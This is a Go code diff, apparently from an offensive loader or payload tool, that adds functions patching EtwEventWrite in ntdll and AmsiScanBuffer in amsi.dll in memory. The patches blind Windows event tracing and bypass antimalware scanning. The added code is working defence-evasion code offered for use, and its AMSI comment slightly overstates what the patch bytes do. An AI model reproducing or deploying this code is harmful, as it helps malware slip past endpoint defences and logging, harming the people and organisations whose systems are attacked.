@@ -85,3 +85,55 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, v
 	//{{end}}
 	return nil
 }
+
+// PatchETW patches EtwEventWrite in ntdll to return immediately,
+// blinding ETW-based telemetry (e.g. .NET CLR, PowerShell, Defender).
+func PatchETW() error {
+	ntdll, err := windows.LoadDLL("ntdll.dll")
+	if err != nil {
+		return err
+	}
+	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
+	if err != nil {
+		return err
+	}
+	// xor rax, rax; ret (return 0 = STATUS_SUCCESS)
+	patch := []byte{0x48, 0x33, 0xC0, 0xC3}
+	var old uint32
+	err = windows.VirtualProtect(etwEventWrite.Addr(), uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &old)
+	if err != nil {
+		return err
+	}
+	for i := 0; i < len(patch); i++ {
+		loc := uintptr(etwEventWrite.Addr() + uintptr(i))
+		mem := (*[1]byte)(unsafe.Pointer(loc))
+		(*mem)[0] = patch[i]
+	}
+	return windows.VirtualProtect(etwEventWrite.Addr(), uintptr(len(patch)), old, &old)
+}
+
+// PatchAMSI patches AmsiScanBuffer in amsi.dll to always return S_OK
+// with result AMSI_RESULT_CLEAN, bypassing AMSI scanning.
+func PatchAMSI() error {
+	amsi, err := windows.LoadDLL("amsi.dll")
+	if err != nil {
+		return err
+	}
+	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
+	if err != nil {
+		return err
+	}
+	// xor eax, eax; ret (return 0 = S_OK)
+	patch := []byte{0x33, 0xC0, 0xC3}
+	var old uint32
+	err = windows.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &old)
+	if err != nil {
+		return err
+	}
+	for i := 0; i < len(patch); i++ {
+		loc := uintptr(amsiScanBuffer.Addr() + uintptr(i))
+		mem := (*[1]byte)(unsafe.Pointer(loc))
+		(*mem)[0] = patch[i]
+	}
+	return windows.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), old, &old)
+}
